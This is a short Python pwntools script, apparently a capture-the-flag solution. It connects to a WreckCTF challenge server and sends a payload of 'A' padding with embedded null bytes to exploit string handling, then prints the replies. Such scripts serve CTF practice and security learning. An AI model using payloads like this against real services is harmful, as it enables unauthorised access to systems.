from pwn import *

p = remote('challs.wreckctf.com', 31009)

payload = b'A'*15 + b'\x00' + b'A'*15 + b'\x00'

print(p.recvline())
print(payload)
p.sendline(payload)
print(p.recvline())
p.close()